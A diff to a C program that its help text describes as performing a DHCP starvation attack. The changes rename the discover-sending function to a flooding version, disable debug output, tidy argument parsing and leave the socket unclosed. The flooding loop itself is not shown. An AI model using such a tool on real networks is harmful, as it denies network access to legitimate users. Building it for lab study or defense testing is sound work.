@@ -32,8 +32,7 @@
 #define DHCP_OPTION_MESSAGE_TYPE 53
 #define END_OPTION 255
 
-
-#define DEBUG 1
+//#define DEBUG 1
 
 #ifdef DEBUG
 #define debug_print(...) \
@@ -100,8 +99,8 @@ int create_dhcp_socket() {
     return sock;
 }
 
-/* sends a DHCPDISCOVER broadcast message in an attempt to find DHCP servers */
-void send_DHCP_discover(int sock) {
+/* sends DHCP discover in a loop */
+void flood_DHCP_discover(int sock) {
     uint8_t chaddr[CHADDR_LEN] = {0};   // MAC address
     dhcp_packet discover_packet;
     struct sockaddr_in sockaddr_broadcast;
@@ -136,7 +135,7 @@ void send_DHCP_discover(int sock) {
     /* END of options */
     discover_packet.options[7] = END_OPTION;
 
-    /* send the DHCPDISCOVER packet to broadcast address */
+    /* send to broadcast */
     sockaddr_broadcast.sin_family = AF_INET;
     sockaddr_broadcast.sin_port = htons(DHCP_SERVER_PORT);
     sockaddr_broadcast.sin_addr.s_addr = INADDR_BROADCAST;
@@ -172,9 +171,9 @@ void print_help() {
             "\tProgram performs DHCP starvation attack.\n");
 }
 
-int parse_args(int argc, char **argv) {
+void parse_args(int argc, char **argv) {
     int c;
-    while ((c = getopt (argc, argv, "i:")) != -1)
+    while ((c = getopt (argc, argv, "i:")) != -1) {
         switch (c)
         {
             case 'i':
@@ -184,6 +183,7 @@ int parse_args(int argc, char **argv) {
                 print_help();
                 exit(0);
         }
+    }
 }
 
 int main(int argc, char **argv) {
@@ -196,8 +196,8 @@ int main(int argc, char **argv) {
     int dhcp_socket = create_dhcp_socket();
 
     /* flood DHCP DISCOVER packets*/
-    send_DHCP_discover(dhcp_socket);
+    flood_DHCP_discover(dhcp_socket);
 
-    close(dhcp_socket);
+//    close(dhcp_socket);
 
 }
